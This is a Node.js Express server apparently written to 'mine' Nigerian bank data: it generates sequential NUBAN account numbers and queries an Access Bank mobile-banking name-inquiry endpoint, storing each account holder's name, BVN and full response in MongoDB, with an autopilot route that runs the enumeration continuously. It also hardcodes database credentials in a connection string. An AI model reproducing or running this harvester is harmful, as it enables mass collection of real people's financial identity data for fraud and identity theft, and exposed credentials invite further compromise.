const nuban = require("./cbn/nuban_algo");
const bank_codes = require("./cbn/digit_codes");

const express = require("express");
const app = express();
var bodyParser = require('body-parser');
var sizeLimit = process.env.SIZE_LIMIT || '5mb';
app.use(bodyParser.json({
    limit: sizeLimit
}));
app.use(bodyParser.urlencoded({
    limit: sizeLimit,
    extended: true
}));

const axios = require("axios");
const {
    generate_nuban
} = require("./cbn/nuban_algo");
const mongoose = require("mongoose");
require("./models/hippo")
require("./models/hippoMetrics");
var hippo = mongoose.model("hippo");
var hippoMetrics = mongoose.model("hippoMetrics");
if (process.env.NODE_ENV == 'production') var mongodbURL = 'mongodb+srv://hippo:hippo@cluster0.ztvy8.gcp.mongodb.net/hippopotamus?retryWrites=true&w=majority';
else if (process.env.NODE_ENV == 'development') var mongodbURL = 'mongodb://localhost:27017/hippopotamus';
else mongodbURL = 'mongodb+srv://hippo:hippo@cluster0.ztvy8.gcp.mongodb.net/hippopotamus?retryWrites=true&w=majority';

try {
    mongoose.connect(mongodbURL)
} catch (error) {
    console.log(error)
    throw error
}

app.use(express.static(__dirname + "/public"))
app.set('views', __dirname + "/views")
app.set('view engine', 'pug');
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "PUT,DELETE,POST,GET")
    next();
});

const lastMineUp = async () => {
    var hM = await hippo.findOne({
        mineMetrics: true
    });
    return (hM == null) ? "unCalculated" : hM.lastMineUp;
}
const lastMineDown = async () => {
    var hM = await hippo.findOne({
        mineMetrics: true
    });
    return (hM == null) ? "unCalculated" : hM.lastMineDown;
}
const mineAmount = async () => {
    var hM = await hippo.findOne({
        mineMetrics: true
    });
    return (hM == null) ? "unCalculated" : hM.mineAmount;
}
const lastMineUpBank = async (code) => {
    var hM = await hippo.find({bankCode : code});
    var rt = hM.sort((a,b) => Number(b['accountNumber'] - Number(a['accountNumber'])))[0];
    return rt ? rt : null;
}
const lastMineDownBank = async (code) => {
    var hM = await hippo.find({bankCode : code});
    var rt = hM.sort((a,b) => Number(a['accountNumber'] - Number(b['accountNumber'])))[0];
    return rt ? rt : null;
}
const setLastMineUp = async (d) => {
    d = await d;
    var hM = await hippo.findOne({
        mineMetrics: true
    });
    hM.lastMineUp = d;
    hM.save();
}

const setLastMineDown = async (d) => {
    d = await d;
    var hM = await hippo.findOne({mineMetrics : true});
    hM.lastMineDown = d;
    hM.save();
}

const setMineAmount = async () => {
    var hM = await hippo.findOne({mineMetrics : true});
    hM.mineAmount = Number(hM.mineAmount) + 1;
    hM.save();
}

app.get("/mine/:startAccount/:bankCode/:direction/:steps", async (req, res) => {
    var {
        startAccount,
        bankCode,
        direction,
        steps
    } = req.params;
    for (var i = 0; i < steps; i++) {
        var serial_no;
        console.log(`${i}  ------------------------><`)
        direction == "up" ? serial_no = Number(startAccount) + i : serial_no = startAccount - i;
        var serial_no_length = serial_no.toString().length;
        if (serial_no_length < 9) {
            var zeroAmount = 9 - serial_no_length;
            for (var o = 0; o < zeroAmount; o++) {
                serial_no = "0" + serial_no;
            }
        }
        var gen = await generate_nuban(serial_no, bankCode);

        var hippoExist = await hippo.findOne({
            accountNumber: gen
        });
        if (hippoExist == null) {
            var isHigh = Math.max(Number(await lastMineUp().accountNumber), Number(gen)) == gen;
            var isLow = Math.min(Number(await lastMineDown().accountNumber), Number(gen)) == gen;
            console.log(`${gen} is high : ${isHigh} ; is low : ${isLow}`)
            try {
                var resp = await axios.get(`https://abp-mobilebank.accessbankplc.com/VBPAccess/webresources/nipNameInquiry2?destinationBankCode=${bankCode}&accountNumber=${gen}`);
                //console.log(`${resp.data}`);
            } catch (e) {
                res.json({
                    error: "error in connect"
                });
            }
            var data = resp.data;
            if (data.customerAccountName != null) {

                var pdata = {
                    bvn: data.beneficiaryBvn,
                    accountNumber: gen,
                    name: data.customerAccountName,
                    bankCode: bankCode,
                    dateMined: new Date(),
                    dump: data
                };
                var person = new hippo(pdata);

                if (isHigh) setLastMineUp(pdata);
                else if (isLow) setLastMineDown(pdata);
                else console.log("in-between");
                try {
                    await setMineAmount();
                    person.save();
                } catch (e) {
                    res.json("error saving")
                }
            }
        } else console.log(`${gen} exists`);
    }
    res.json({
        success: "mining finished"
    });
})

var nubans = {
    "011" : "312730235",
    "044" : "010396170"
}
ping = async (t,hippoLeg) => {
    clearInterval()
    var timeStart = (new Date().getTime()) /1000;
    setInterval(async () => {
        var now = (new Date().getTime())/1000;
        var diff = Number(Math.round(now - timeStart));
        var check = (diff <= Number(t));
        if(check === true){
            try{
                var req = await axios.get(`https://h3ppo.herokuapp.com/ping/${hippoLeg}`);
                req = req.json();
                logMsg = `Pinged result : ${req} \n`;
            }
            catch(e){
                console.log(`Error connecting  \n`);
                console.log(e)
            }
        }
        else clearInterval();
    }, 300000);
}
chip = async (x) => {
    var {timeStart,timeFrame,serial_no,startAccount,i,direction,bankCode,hippoLeg} = x;
    ping(timeFrame,hippoLeg);
    while(Number(Math.round((new Date().getTime()/1000) - timeStart)) <= timeFrame){
        i++;
        direction == "up" ? (
            serial_no = Number(startAccount) + i 
        ): serial_no = startAccount - i;
        var serial_no_length = serial_no.toString().length;
        if (serial_no_length < 9) {
            var zeroAmount = 9 - serial_no_length;
            for (var o = 0; o < zeroAmount; o++) {
                serial_no = "0" + serial_no;
            }
        }
        var gen = await generate_nuban(serial_no, bankCode);
        console.log(gen)
        
        var hippoExist = await hippo.findOne({
            accountNumber: gen
        });
        console.log(hippoExist)
        if (hippoExist == null) {
            console.log("fetching")
            try {
                var resp = await axios.get(`https://abp-mobilebank.accessbankplc.com/VBPAccess/webresources/nipNameInquiry2?destinationBankCode=${bankCode}&accountNumber=${gen}`);
                //console.log(`${resp.data}`);
            } catch (e) {
                console.log("Error connecting");
            }
            var data = resp.data;
            if (data.customerAccountName != null) {
                console.log("fetched");
                var pdata = {
                    bvn: data.beneficiaryBvn,
                    accountNumber: gen,
                    name: data.customerAccountName,
                    bankCode: bankCode,
                    dateMined: new Date(),
                    dump: data
                };
                var person = new hippo(pdata);
                try {
                     setMineAmount();
                    console.log("saving");
                    person.save();
                } catch (e) {
                    res.json("error saving")
                }
            }
        } else console.log(`${gen} exists`);
    }
}
app.get("/autopilot/:timeFrame/:bankCode/:direction/:hippoLeg",async (req,res)=>{
    var {timeFrame,bankCode,direction,hippoLeg} = req.params;
    var timeStart = (new Date().getTime()) /1000;
    var serial_no, startAccount, i = 0;
    startAccount = direction == 'up' ? await lastMineUpBank(bankCode).accountNumber : await lastMineDownBank(bankCode).accountNumber;
    startAccount ? "" : startAccount = nubans[`${bankCode}`];
    console.log("started from :: " + startAccount);
    chip(
        {
            timeStart : timeStart,
            timeFrame : timeFrame,
            serial_no :serial_no,
            startAccount :startAccount,
            bankCode : bankCode,
            i: i,
            direction : direction,
            hippoLeg : hippoLeg
        }
    )
    res.json({type : "success", msg : "Autopilot activated"});
})
app.get("/ping", async (req, res) => {
    res.json({type:"success",msg:"ping received"});
})
app.listen(process.env.PORT ? process.env.PORT : 9191, (e) => {
    if (e) throw e;
    console.log("..mining in session");
})